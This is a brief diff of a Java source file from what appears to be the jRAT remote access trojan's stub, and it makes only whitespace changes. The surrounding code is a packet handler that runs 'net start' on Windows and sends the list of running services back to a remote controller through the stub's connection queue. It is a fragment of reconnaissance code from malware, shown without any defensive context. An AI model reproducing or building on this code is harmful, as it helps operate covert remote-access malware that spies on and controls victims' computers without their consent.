@@ -7,8 +7,6 @@ import pro.jrat.common.OperatingSystem;
 import pro.jrat.stub.Connection;
 import pro.jrat.stub.packets.outgoing.Packet52WindowsService;
 
-
-
 public class Packet77ListServices extends AbstractIncomingPacket {
 
 	@Override
@@ -17,9 +15,9 @@ public class Packet77ListServices extends AbstractIncomingPacket {
 			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
 				Process p = Runtime.getRuntime().exec("net start");
 				BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
-				
+
 				String line;
-				
+
 				while ((line = reader.readLine()) != null) {
 					if (line.startsWith(" ")) {
 						Connection.addToSendQueue(new Packet52WindowsService(line.trim()));
